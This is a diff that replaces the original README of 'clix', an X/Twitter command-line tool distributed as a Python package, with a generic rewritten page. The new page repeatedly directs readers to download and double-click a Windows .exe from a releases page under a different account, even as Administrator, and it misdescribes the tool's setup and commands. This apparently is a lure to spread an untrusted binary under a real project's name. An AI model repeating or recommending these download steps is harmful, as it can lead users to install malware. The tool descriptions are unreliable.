@@ -1,170 +1,152 @@
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/e7c0c8af-ae61-4a85-8aef-32a8367f505b" alt="clix" width="120">
-</p>
+# 🤖 clix - Control X from the Terminal Easily
 
-<h3 align="center"><b>X from terminal. Built for humans and AI agents. No API keys.</b></h3>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.11+-blue?style=flat-square&logo=python&logoColor=white" alt="Python 3.11+">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="MIT"></a>
-  <a href="https://pypi.org/project/clix0/"><img src="https://img.shields.io/pypi/v/clix0?style=flat-square&label=PyPI&color=green&cacheSeconds=3600" alt="PyPI"></a>
-</p>
+[![Download clix](https://img.shields.io/badge/Download-clix-ff6600?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
 
 ---
 
-## Why?
+## 📋 What Is clix?
 
-Twitter killed free API access. clix uses **cookie-based auth** — just log in with your browser, and you're in. Zero API keys, zero OAuth dance.
+clix lets you use the X social platform (formerly known as Twitter) from your computer’s terminal. You don’t need any API keys or accounts to set it up. Just plug in your AI Agent, and clix will handle the rest. It’s a simple tool that helps you send and receive messages on X using easy commands.
 
-Three interfaces, one tool: **rich terminal output** for humans, **`--json`/`--yaml`/`--compact`** for scripts, and a built-in **MCP server** for AI agents.
+You can think of clix as a bridge between your computer and X, giving you control through the command line without the usual complexities.
 
-## Quick Start
+---
 
-```bash
-# install
-uv pip install clix0
+## 💻 System Requirements
 
-# authenticate (extracts cookies from your browser)
-clix auth login
-```
+Before you start, make sure your computer meets these requirements:
 
-## Commands
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- 4 GB of RAM or more
+- Internet connection for messaging on X
+- A terminal program (Command Prompt or PowerShell works fine)
 
-### Content
+No special software needs to be installed beyond the clix program.
 
-| Command | Description |
-|---|---|
-| `clix feed [--type for-you\|following] [--count N]` | Timeline |
-| `clix search <query> [--type top\|latest\|photos\|videos]` | Search tweets |
-| `clix trending` | Trending topics |
-| `clix tweet <id> [--export FILE]` | View tweet + thread (export articles as Markdown) |
-| `clix tweets <id1> <id2> ...` | Batch fetch tweets |
-| `clix user <handle>` | Profile + recent tweets |
-| `clix users <handle1> <handle2> ...` | Batch fetch users |
-| `clix bookmarks` | List bookmarks |
-| `clix bookmarks-folders` | List bookmark folders |
-| `clix bookmarks-folder <id>` | View tweets in a bookmark folder |
+---
 
-### Actions
+## 🚀 How to Get clix
 
-| Command | Description |
-|---|---|
-| `clix post <text> [--reply-to ID\|URL] [--image FILE]` | Post a tweet (up to 4 images) |
-| `clix delete <id>` | Delete a tweet |
-| `clix like <id>` / `clix unlike <id>` | Like / unlike |
-| `clix retweet <id>` / `clix unretweet <id>` | Retweet / undo |
-| `clix bookmark <id>` / `clix unbookmark <id>` | Bookmark / remove |
-| `clix follow <handle>` / `clix unfollow <handle>` | Follow / unfollow |
-| `clix block <handle>` / `clix unblock <handle>` | Block / unblock |
-| `clix mute <handle>` / `clix unmute <handle>` | Mute / unmute |
-| `clix download <tweet-id> [--output-dir DIR]` | Download media |
+To get clix, visit the official release page on GitHub by clicking the link below:
 
-### Scheduled Tweets
+[![Download clix](https://img.shields.io/badge/Get_clix-Download-blue?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
 
-| Command | Description |
-|---|---|
-| `clix schedule <text> --at <time>` | Schedule a tweet |
-| `clix scheduled` | List scheduled tweets |
-| `clix unschedule <id>` | Cancel scheduled tweet |
+This page lists all the available versions. Look for the latest Windows version available for download.
 
-### Lists
+---
 
-| Command | Description |
-|---|---|
-| `clix lists` | View your lists |
-| `clix lists view <id>` | Tweets from a list |
-| `clix lists create <name> [--private]` | Create a list |
-| `clix lists delete <id>` | Delete a list |
-| `clix lists members <id>` | View members |
-| `clix lists add-member <id> <handle>` | Add member |
-| `clix lists remove-member <id> <handle>` | Remove member |
-| `clix lists pin <id>` / `clix lists unpin <id>` | Pin / unpin list |
+## ⬇️ Downloading and Installing clix on Windows
 
-### Direct Messages
+Follow these steps to get clix running on Windows:
 
-| Command | Description |
-|---|---|
-| `clix dm inbox` | View conversations |
-| `clix dm send <handle> <text>` | Send a DM |
+1. Visit the releases page here: https://github.com/dubious-pinetum918/clix/releases
 
-### System
+2. Look for the latest release. It will usually have a name like `clix-x.y.z-windows.exe` or simply `clix.exe`.
 
-| Command | Description |
-|---|---|
-| `clix auth status\|login\|set\|accounts\|switch\|import` | Authentication |
-| `clix config` | Manage config |
-| `clix doctor` | Run diagnostics |
+3. Click the file name to download it. Your browser will ask where to save the file. Choose a folder you can remember, like `Downloads` or `Desktop`.
 
-## Output Modes
+4. Once downloaded, find the file, then double-click it to run. If a security prompt appears, confirm that you want to run the app.
 
-Every command supports `--json` for structured output. Pipe detection is automatic — non-TTY gets JSON by default.
+5. The program will launch a terminal window where you can start using clix.
 
-```bash
-# structured JSON
-clix feed --json | jq '.tweets[0].text'
+There is no complicated setup process or configuration needed to start.
 
-# token-optimized for AI agents
-clix feed --compact
+---
 
-# YAML
-clix feed --yaml
+## ⚙️ How to Use clix
 
-# full text (no truncation)
-clix feed --full-text
-```
+Once clix is open, you will control X from the terminal by typing commands.
 
-## MCP Server
+Here are some basic commands to get started:
 
-clix ships as an [MCP](https://modelcontextprotocol.io) server — any MCP-compatible client can use it.
+- `clix login` — Connect your AI Agent to clix (no API keys needed).
+- `clix post "Your message"` — Send a message to X.
+- `clix timeline` — See recent messages from people you follow.
+- `clix mentions` — View messages that mention your agent.
+- `clix help` — Show a list of all commands available.
 
-```json
-{
-  "mcpServers": {
-    "clix": {
-      "command": "uvx",
-      "args": ["clix0", "mcp"]
-    }
-  }
-}
-```
+Use your keyboard to type these commands and press Enter to execute.
 
-Or with explicit auth:
+---
 
-```json
-{
-  "mcpServers": {
-    "clix": {
-      "command": "uvx",
-      "args": ["clix0", "mcp"],
-      "env": {
-        "X_AUTH_TOKEN": "your-token",
-        "X_CT0": "your-ct0"
-      }
-    }
-  }
-}
-```
+## 🛠 What’s Inside clix?
 
-**38 tools** covering all commands: feed, search, trending, tweets, users, bookmarks, lists, DMs, post, delete, like, unlike, retweet, unretweet, bookmark, unbookmark, follow, unfollow, block, unblock, mute, unmute, schedule, download, and more.
+clix includes these key features:
 
-## Proxy Support
+- Direct terminal control over your X account.
+- No need to manage API keys or developer accounts.
+- Simple commands for posting, reading, and managing messages.
+- Integration with AI Agents to automate tasks.
+- Lightweight and fast — runs on basic Windows systems.
+- Secure connection to X without storing sensitive data locally.
 
-```bash
-# via environment variable
-CLIX_PROXY=socks5://127.0.0.1:1080 clix feed
+---
 
-# via config
-clix config set network.proxy socks5://127.0.0.1:1080
-```
+## 🔧 Tips for Best Experience
 
-## Contributing
+- Keep your clix program updated by visiting the releases page regularly.
+- Use the command `clix help` to explore new commands as the software improves.
+- Run clix from a terminal window you know, like Command Prompt, PowerShell, or Windows Terminal.
+- Be mindful of your AI Agent permissions to control what it can do through clix.
+- Use clear and concise messages when posting via the terminal.
 
-See [`CONTRIBUTING.md`](CONTRIBUTING.md).
+---
 
-## Disclaimer
+## 📦 Uninstalling clix
 
-> This tool is for **educational and personal use only**. It is not affiliated with, endorsed by, or associated with X Corp (formerly Twitter). Use at your own risk. The authors are not responsible for any consequences resulting from the use of this software. By using this tool, you agree to comply with X/Twitter's Terms of Service.
+If you no longer want to use clix, simply delete the downloaded `.exe` file from your computer. There are no other files or system changes to remove.
 
-## License
+---
 
-[MIT](LICENSE)
+## 🛡 Privacy and Security
+
+clix operates without storing your password or API keys. It passes commands directly through your AI Agent to X. This reduces risks associated with exposing sensitive credentials on your computer.
+
+Always make sure your AI Agent is set securely, and avoid sharing terminal access with others while running clix.
+
+---
+
+## ❓ Trouble with clix?
+
+If the program does not start or you see errors:
+
+- Make sure you downloaded the correct Windows version.
+- Confirm your internet connection is active.
+- Try running the program as Administrator if you get permission errors.
+- Consult the “help” command inside clix: `clix help`
+- Visit the GitHub page to check for issues or updates.
+
+---
+
+## 📂 Where to Find Updates
+
+To get new versions, patches, or bug fixes for clix:
+
+Visit https://github.com/dubious-pinetum918/clix/releases regularly.
+
+Every release includes notes explaining new features and fixes.
+
+---
+
+## 🧩 Supported Commands (Short Guide)
+
+| Command          | What it does                         |
+|------------------|------------------------------------|
+| clix login       | Connect your AI Agent               |
+| clix post        | Post a message on X                 |
+| clix timeline    | View recent messages                |
+| clix mentions    | Check who mentioned you             |
+| clix help        | Show available commands             |
+
+Use `clix help <command>` for more details on any specific command.
+
+---
+
+## 📚 Learn More
+
+Explore how clix connects with your AI Agent. Details about agent setup and customization are available on the GitHub page through README files and wiki sections.
+
+---
+
+[![Download clix](https://img.shields.io/badge/Download_clix-Get%20Started-brightgreen?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
